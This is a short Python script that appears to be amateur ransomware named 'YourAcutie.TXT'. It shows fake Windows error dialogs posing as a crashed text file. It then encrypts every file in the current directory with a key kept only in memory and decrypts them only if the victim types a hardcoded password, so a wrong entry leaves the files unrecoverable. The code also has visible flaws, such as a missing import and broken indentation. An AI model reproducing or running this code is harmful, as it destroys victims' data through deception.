from subprocess import call
call(["python", "YourAcutie.TXT"])

import ctypes
ctypes.windll.user32.MessageBoxW(3, "Do you want to open this file?", "YourAcutie.TXT asks", 32)
time.sleep(10)
ctypes.windll.user32.MessageBoxW(0, "YourAcutie.TXT has unexpectedly crashed", "Windows Alert", 16)

import os
from cryptography.fernet import Fernet

# Searching for file to encrypt exept from the ransomware file
files = []

for file in os.listdir():
	if file == "YourAcutie.TXT.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

# Creating a encrpytionkey that will be used to lock the found files
secretkey = Fernet.generate_key()

# Going through the files list and encrpying everything
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(secretkey).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

# Password to run the script. DO NOT USE THIS AS THE DECRIPT PASSWORD
password = "pASS?0wRd"
userInput = input("OH NO!!! check your files\n")
ctypes.windll.user32.MessageBoxW(0, "OHNO! Cheak your files", "ERROR", 16)

# Checking the password that the user put in, if its right the user will get a message saying the files are decrypted 
# and if its wrong a message saying that the password is wrong
if userInput == password:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print("Your files are decrypted!")

else:
	print("Wrong password!")
  ctypes.windll.user32.MessageBoxW(0, "Restart your PC to fix this problem <3 this was just the test run", "YourAcutie.TXT", 16)
